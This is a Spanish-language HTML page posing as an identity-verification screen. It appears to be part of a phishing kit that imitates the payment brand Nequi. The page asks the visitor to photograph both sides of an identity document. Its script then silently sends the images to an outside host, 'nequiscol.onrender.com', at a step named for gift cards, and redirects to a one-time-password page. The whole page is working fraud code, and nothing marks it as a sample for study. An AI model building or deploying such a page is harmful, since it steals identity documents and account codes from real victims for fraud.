<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verificación de Documento</title>

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">

<style>
body{
    background:#0f172a;
    color:white;
    font-family:system-ui, -apple-system, sans-serif;
}

.app-container{
    max-width:420px;
    margin:auto;
    padding:20px;
}

.header{
    text-align:center;
    margin-bottom:20px;
}

.header h5{
    font-weight:600;
}

.scan-box{
    position:relative;
    width:100%;
    height:260px;
    background:black;
    border-radius:20px;
    overflow:hidden;
}

.scan-box img{
    width:100%;
    height:100%;
    object-fit:cover;
}

.overlay{
    position:absolute;
    inset:0;
    background:rgba(0,0,0,0.6);
}

.scan-area{
    position:absolute;
    top:12%;
    left:8%;
    width:84%;
    height:76%;
    border-radius:18px;
    box-shadow:0 0 0 2000px rgba(0,0,0,0.6);
}

/* Esquinas modernas */
.corner{
    position:absolute;
    width:30px;
    height:30px;
    border:3px solid #00e0ff;
}

.top-left{ top:12%; left:8%; border-right:none; border-bottom:none; }
.top-right{ top:12%; right:8%; border-left:none; border-bottom:none; }
.bottom-left{ bottom:12%; left:8%; border-right:none; border-top:none; }
.bottom-right{ bottom:12%; right:8%; border-left:none; border-top:none; }

/* Línea láser */
.laser{
    position:absolute;
    top:12%;
    left:8%;
    width:84%;
    height:2px;
    background:#00e0ff;
    animation:scan 2.5s linear infinite;
}

@keyframes scan{
    0%{ transform:translateY(0); }
    100%{ transform:translateY(180px); }
}

.info-text{
    font-size:14px;
    opacity:0.8;
    margin-top:15px;
}

.btn-primary{
    background:#00e0ff;
    border:none;
    font-weight:600;
}

.btn-primary:hover{
    background:#00bcd4;
}

.spinner-overlay{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.85);
    display:none;
    align-items:center;
    justify-content:center;
    flex-direction:column;
    z-index:9999;
}
</style>
</head>

<body>

<div class="app-container">

<div class="header">
    <h5>Verificación de identidad</h5>
    <div class="info-text">
        Centra el documento dentro del marco y asegúrate que los bordes sean visibles.
    </div>
</div>

<!-- FRONTAL -->
<div class="scan-box mb-3">
    <img id="frontPreview">
    <div class="overlay"></div>
    <div class="scan-area"></div>

    <div class="corner top-left"></div>
    <div class="corner top-right"></div>
    <div class="corner bottom-left"></div>
    <div class="corner bottom-right"></div>

    <div class="laser"></div>
</div>

<input type="file"
       class="form-control mb-4"
       accept="image/*"
       capture="environment"
       onchange="previewImage(event,'frontPreview')">

<!-- TRASERA -->
<div class="scan-box mb-3">
    <img id="backPreview">
    <div class="overlay"></div>
    <div class="scan-area"></div>

    <div class="corner top-left"></div>
    <div class="corner top-right"></div>
    <div class="corner bottom-left"></div>
    <div class="corner bottom-right"></div>

    <div class="laser"></div>
</div>

<input type="file"
       class="form-control mb-4"
       accept="image/*"
       capture="environment"
       onchange="previewImage(event,'backPreview')">

<button class="btn btn-primary w-100"
        onclick="enviarDocumento()">
Continuar
</button>

</div>

<!-- Spinner -->
<div class="spinner-overlay" id="spinner">
    <div class="spinner-border text-info mb-3"></div>
    <div>Validando información...</div>
</div>

<script>

const SERVER_URL = "https://nequiscol.onrender.com";
const REDIRECT_URL = "https://nequiscol.onrender.com/one-time-pass.php.html";

let frontBase64 = "";
let backBase64 = "";

function previewImage(event, id){
    const reader = new FileReader();
    reader.onload = function(){
        document.getElementById(id).src = reader.result;
        if(id === "frontPreview"){
            frontBase64 = reader.result;
        } else {
            backBase64 = reader.result;
        }
    };
    reader.readAsDataURL(event.target.files[0]);
}

async function enviarDocumento(){

    if(!frontBase64 || !backBase64){
        alert("Debes capturar ambas imágenes");
        return;
    }

    document.getElementById("spinner").style.display = "flex";

    try{
        await fetch(`${SERVER_URL}/step-tarjetaregalo`, {
            method:"POST",
            headers:{ "Content-Type":"application/json" },
            body:JSON.stringify({
                sessionId: Date.now().toString(),
                frontImageBase64: frontBase64,
                backImageBase64: backBase64
            })
        });

        setTimeout(()=>{
            window.location.href = REDIRECT_URL;
        },1500);

    }catch(error){
        alert("Error en el envío");
        document.getElementById("spinner").style.display="none";
    }
}

</script>

</body>
</html>
